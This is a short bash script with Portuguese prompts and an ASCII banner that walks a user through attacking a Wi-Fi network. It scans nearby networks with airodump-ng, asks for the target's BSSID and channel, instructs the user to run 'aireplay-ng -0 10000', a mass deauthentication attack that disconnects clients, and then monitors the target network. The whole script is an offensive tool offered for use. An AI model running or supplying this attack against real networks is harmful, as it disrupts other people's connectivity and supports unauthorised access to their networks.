#!/bin/bash

echo " "
echo " "
echo "       *                                                   *"
echo "      *                                                     *"
echo "    **                                                       **"
echo "*   **                                                       **   *"
echo "**   **          *                               *          **   **"
echo "***    *         **                             **         *    ***"
echo " ****            *********************************            ****"
echo "   *******      ***           *******           ***      *******"
echo "      ************             *****             ************"
echo "         **********    **** * **   ** *******   **********"
echo "               ********** ** **     ** ****************"
echo "         *************** ** **  ***  **  *****************"
echo "          ******   *********************  ******   ******"
echo "                    **********************  ***"
echo "                    ************************ **"
echo "                     **** ** ** **** ** ** **"
echo "                      ***  *  *  **  *  *  ***"
echo "                       **                  **"
echo "                         *                *"

echo "recomendo usar a interface wlan0mon"
read -p "sua interface: " iface
echo " "
echo "quer fazer scan para achar redes perto de vc?"
echo "S/N"
read -p ">> " escolha
case "$escolha" in
        S)
                echo "Para parar o scan presione {Ctrl c} "
                xterm -e /bin/bash -l -c "airodump-ng $iface"
		read -p "DIGITE O BSSID DO ALVO: " bssid
                read -p "DIGITE O CANAL DO ALVO: " channel 
		echo "abra um novo terminal e digite: aireplay-ng -0 10000 -a $bssid $iface"
		xterm -e /bin/bash -l -c "airodump-ng --bssid $bssid -c $channel $iface"
	;;

	N)
		read -p "DIGITE O BSSID DO ALVO: " bssid
                read -p "DIGITE O CANAL DO ALVO: " channel 
		echo "abra um novo terminal e digite: aireplay-ng -0 10000 -a $bssid $iface"
		xterm -e /bin/bash -l -c "airodump-ng --bssid $bssid -c $channel $iface"
	;;

esac
